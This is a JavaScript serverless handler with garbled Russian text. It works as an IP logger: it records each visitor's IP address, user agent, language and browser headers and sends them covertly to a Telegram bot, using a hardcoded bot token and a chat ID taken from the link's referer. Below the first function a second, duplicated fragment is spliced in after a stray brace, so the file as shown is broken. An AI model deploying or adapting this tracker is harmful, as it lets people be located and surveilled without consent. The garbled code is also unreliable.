export default async function handler(req, res) {
  // –†–∞–∑—Ä–µ—à–∞–µ–º CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º preflight –∑–∞–ø—Ä–æ—Å
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const token = '7386186054:AAEkM7twC4_OCgK-1-0sZq2Lkfui_ftyyw4';
    const defaultChatId = '8382514971';
    
    // –ü–æ–ª—É—á–∞–µ–º chat_id –∏–∑ query –ø–∞—Ä–∞–º–µ—Ç—Ä–∞
    let chatId = defaultChatId;
    try {
      const referer = req.headers.referer || '';
      if (referer) {
        const url = new URL(referer);
        const tgParam = url.searchParams.get('tg');
        if (tgParam) {
          chatId = tgParam;
        }
      }
    } catch (e) {
      console.log('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ chat_id:', e.message);
    }
    
    // –ü–æ–ª—É—á–∞–µ–º IP –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.socket?.remoteAddress ||
               'Unknown';
    
    // –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';
    const accept = req.headers['accept'] || 'Unknown';
    const host = req.headers['host'] || 'Unknown';
    const secChUa = req.headers['sec-ch-ua'] || 'Unknown';
    
    // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram –ø–æ –≤–∞—à–µ–º—É —Ñ–æ—Ä–º–∞—Ç—É
    const message = `üîî –ù–æ–≤—ã–π –ø–µ—Ä–µ—Ö–æ–¥ –ø–æ —Å—Å—ã–ª–∫–µ!

üñ•Ô∏è IP: ${ip}
üåê Host: ${host}

üì± User Agent: ${userAgent}

üó£Ô∏è Language: ${acceptLanguage}
‚úÖ Accept: ${accept}
üì± Browser: ${secChUa}

‚ÑπÔ∏è –í–µ—á–Ω–∞—è —Å—Å—ã–ª–∫–∞ –Ω–∞ –±–æ—Ç–∞: faidiksearch.xyz`;

    console.log('–û—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram:', {
      chatId,
      ip,
      host
    });

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram
    const telegramResponse = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });

    const result = await telegramResponse.json();
    console.log('–û—Ç–≤–µ—Ç Telegram:', result);

    if (result.ok) {
      res.status(200).json({ 
        success: true, 
        message: '–î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram'
      });
    } else {
      console.error('–û—à–∏–±–∫–∞ Telegram API:', result);
      res.status(500).json({ 
        success: false, 
        error: '–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram'
      });
    }

  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
      }    const secFetchMode = req.headers['sec-fetch-mode'] || 'Unknown';
    const secFetchSite = req.headers['sec-fetch-site'] || 'Unknown';
    const secChUa = req.headers['sec-ch-ua'] || 'Unknown';
    const host = req.headers['host'] || 'Unknown';
    
    // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
    const message = `
üîî –ù–æ–≤—ã–π –ø–µ—Ä–µ—Ö–æ–¥ –ø–æ —Å—Å—ã–ª–∫–µ!

üñ•Ô∏è IP: ${ip}
üåê Host: ${host}

üì± User Agent: ${userAgent}

–î—Ä—É–≥–∏–µ –¥–∞–Ω–Ω—ã–µ.. 

üó£Ô∏è Language: ${acceptLanguage}
‚úÖ Accept: ${accept}
üì± Browser: ${secChUa}

‚ÑπÔ∏è –í–µ—á–Ω–∞—è —Å—Å—ã–ª–∫–∞ –Ω–∞ –±–æ—Ç–∞: faidiksearch.xyz
    `.trim();

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });

    res.status(200).json({ success: true });

  } catch (error) {
    res.status(200).json({ success: false });
  }
}
